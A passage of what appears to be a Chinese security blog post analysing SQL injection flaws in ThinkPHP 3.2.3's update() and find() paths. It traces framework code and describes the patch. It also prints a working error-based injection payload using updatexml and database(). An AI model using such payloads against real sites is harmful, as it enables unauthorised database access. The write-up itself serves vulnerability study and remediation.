$parse = array_map(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;db, <span class="string">'escapeString'</span>), $parse);</span><br><span class="line">			$where = vsprintf($where, $parse);</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (is_object($where)) &#123;</span><br><span class="line">		$where = get_object_vars($where);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (is_string($where) &amp;&amp; <span class="string">''</span> != $where) &#123;</span><br><span class="line">			$map            = <span class="keyword">array</span>();</span><br><span class="line">			$map[<span class="string">'_string'</span>] = $where;</span><br><span class="line">			$where          = $map;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">'where'</span>])) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;options[<span class="string">'where'</span>] = array_merge(<span class="keyword">$this</span>-&gt;options[<span class="string">'where'</span>], $where);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;options[<span class="string">'where'</span>] = $where;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随后进入到<code>Include/Library/Think/Model.class.php</code>中的<code>save()</code></p>
+<p>通过前面的数据处理解析服务端数据库中的数据字段信息，字段数据类型，再到_parseOptions表达式分析，获取到表名，数据表别名，记录操作的模型名称，再去调用回调函数进入update()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data = <span class="string">''</span>, $options = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">		<span class="comment">// 没有传递数据，获取当前数据对象的值</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">			$data = <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">			<span class="comment">// 重置数据</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;error = L(<span class="string">'_DATA_TYPE_INVALID_'</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 数据处理</span></span><br><span class="line">	$data = <span class="keyword">$this</span>-&gt;_facade($data);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($data)) &#123;</span><br><span class="line">		<span class="comment">// 没有数据则不执行</span></span><br><span class="line">		......</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 分析表达式</span></span><br><span class="line">	$options = <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br><span class="line">	$pk      = <span class="keyword">$this</span>-&gt;getPk();</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>($options[<span class="string">'where'</span>])) &#123;</span><br><span class="line">		<span class="comment">// 如果存在主键数据 则自动作为更新条件</span></span><br><span class="line">		<span class="keyword">if</span> (is_string($pk) &amp;&amp; <span class="keyword">isset</span>($data[$pk])) &#123;</span><br><span class="line">			......</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (is_array($pk)) &#123;</span><br><span class="line">			<span class="comment">// 增加复合主键支持</span></span><br><span class="line">			<span class="keyword">foreach</span> ($pk <span class="keyword">as</span> $field) &#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">isset</span>($data[$field])) &#123;</span><br><span class="line">					......</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="comment">// 如果缺少复合主键数据则不执行</span></span><br><span class="line">					......</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">unset</span>($data[$field]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">isset</span>($where)) &#123;</span><br><span class="line">			<span class="comment">// 如果没有任何更新条件则不执行</span></span><br><span class="line">			......</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$options[<span class="string">'where'</span>] = $where;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	......</span><br><span class="line">	$result = <span class="keyword">$this</span>-&gt;db-&gt;update($data, $options);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">false</span> !== $result &amp;&amp; is_numeric($result)) &#123;</span><br><span class="line">		......</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_after_update($data, $options);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>Include/Library/Think/Db/Driver.class.php</code>中<code>update()</code></p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/14.png" width>
+
+<p>首先经过<code>parseBind</code>和<code>parseSet()</code>生成$bind变量，以及拼接了部分SQL语句</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/13.png" width="600">
+
+<p>随后进入到<code>parseWhere()</code>方法中，关键在于其函数体中<code>parseWhereItem()</code>方法，在下面代码块中14行处，将$exp拼接在$wherestr后</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhereItem</span><span class="params">($key,$val)</span> </span>&#123;</span><br><span class="line">    $whereStr = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>(is_array($val)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_string($val[<span class="number">0</span>])) &#123;</span><br><span class="line">			$exp	=	strtolower($val[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">'/^(eq|neq|gt|egt|lt|elt)$/'</span>,$exp)) &#123; <span class="comment">// 比较运算</span></span><br><span class="line">                $whereStr .= $key.<span class="string">' '</span>.<span class="keyword">$this</span>-&gt;exp[$exp].<span class="string">' '</span>.<span class="keyword">$this</span>-&gt;parseValue($val[<span class="number">1</span>]);</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">'/^(notlike|like)$/'</span>,$exp))&#123;<span class="comment">// 模糊查找</span></span><br><span class="line">                <span class="keyword">if</span>(is_array($val[<span class="number">1</span>])) &#123;</span><br><span class="line">                    ......</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $whereStr .= $key.<span class="string">' '</span>.<span class="keyword">$this</span>-&gt;exp[$exp].<span class="string">' '</span>.<span class="keyword">$this</span>-&gt;parseValue($val[<span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="string">'bind'</span> == $exp )&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">                $whereStr .= $key.<span class="string">' = :'</span>.$val[<span class="number">1</span>];</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(<span class="string">'exp'</span> == $exp )&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">                $whereStr .= $key.<span class="string">' '</span>.$val[<span class="number">1</span>];</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">'/^(notin|not in|in)$/'</span>,$exp))&#123; <span class="comment">// IN 运算</span></span><br><span class="line">                ......</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//对字符串类型字段采用模糊匹配</span></span><br><span class="line">       ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $whereStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/15.png" width>
+
+<p>再次回到<code>Include/Library/Think/Db/Driver.class.php</code>中<code>update()</code>中</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/16.png" width>
+
+<p>进入到execute()中，下面对SQL中<code>:0</code>进行替换。</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/17.png" width>
+
+<p>此处$this-&gt;bind变量的值是：</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/19.png" width="500">
+
+<p>这是为什么payload中使用的是”0”而不是其他数字的原因，否则将无法替换SQL语句中的<code>:X</code></p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/18.png" width="600">
+
+<h4 id="find-注入"><a href="#find-注入" class="headerlink" title="find()注入"></a>find()注入</h4><h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>复现要求：<code>think_filter()</code>中未过滤exp</p>
+<p><strong>payload</strong></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[]=exp&amp;id[]= and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>具体分析同上面update注入流程相同</p>
+<p>不使用bind参数是因为find和select中不会对<code>:X</code>进行替换，造成语法错误    </p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/22.png" width="600">
+
+<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/20.png" width>
+
+<p>漏洞造成的一个原因便是<code>Include/Common/functions.php</code>中<code>think_filter</code>中忽略了对bind参数的过滤</p>
+<p>修补之后，系统会在传入值<code>bind</code>后添加一个空格，导致<code>parseWhereItem()</code>中无法将传入的payload拼接到where中</p>
+<img src="//songxpu.github.io/2019/11/15/代码审计/ThinkPHP/thinkphp3.2.3注入分析/21.png" width="600">
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>个人感觉thinkphp3.2.3爆出的SQL漏洞都比较鸡肋，即使不修复以上漏洞，开发者仍然可以规避上面的注入风险（经实例审计后发现的~）</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/2629" target="_blank" rel="noopener">ThinkPHP3.2 框架sql注入漏洞分析(2018-08-23)</a></p>
+<p><a href="https://www.anquanke.com/post/id/104847#h2-0" target="_blank" rel="noopener">Thinkphp3.2.3最新版update注入漏洞</a></p>
+<p><a href="https://xz.aliyun.com/t/2629" target="_blank" rel="noopener">浅谈 ThinkPHP 中的注入</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/31/代码审计/S-CMS审计复现/" rel="next" title="S-CMS代码审计">
+                <i class="fa fa-chevron-left"></i> S-CMS代码审计
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/16/代码审计/ThinkPHP/Thinkphp3.2.3安全开发须知/" rel="prev" title="ThinkPHP3.2.3安全开发须知">
+                ThinkPHP3.2.3安全开发须知 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Azeroth</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">32</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#find-和select"><span class="nav-number">3.1.</span> <span class="nav-text">find()和select()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#审计复现"><span class="nav-number">3.1.1.</span> <span class="nav-text">审计复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload"><span class="nav-number">3.1.1.1.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#table"><span class="nav-number">3.1.1.2.</span> <span class="nav-text">table</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#alias"><span class="nav-number">3.1.1.3.</span> <span class="nav-text">alias</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#where"><span class="nav-number">3.1.1.4.</span> <span class="nav-text">where</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#小试牛刀"><span class="nav-number">3.1.2.</span> <span class="nav-text">小试牛刀</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#group"><span class="nav-number">3.1.2.1.</span> <span class="nav-text">group</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delete"><span class="nav-number">3.2.</span> <span class="nav-text">delete()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#审计复现-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">审计复现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-1"><span class="nav-number">3.2.1.1.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#where-1"><span class="nav-number">3.2.1.2.</span> <span class="nav-text">where</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#table-1"><span class="nav-number">3.2.1.3.</span> <span class="nav-text">table</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞修复"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#补充"><span class="nav-number">4.</span> <span class="nav-text">补充</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#parseWhereItem-造成的注入"><span class="nav-number">4.1.</span> <span class="nav-text">parseWhereItem()造成的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#update-注入"><span class="nav-number">4.1.1.</span> <span class="nav-text">update()注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞复现"><span class="nav-number">4.1.1.1.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#find-注入"><span class="nav-number">4.1.2.</span> <span class="nav-text">find()注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">4.1.2.1.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞修复-1"><span class="nav-number">4.1.3.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">5.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Azeroth</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">160k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">2:26</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+<span id="busuanzi_container_site_uv">
+  本站访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+</span>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
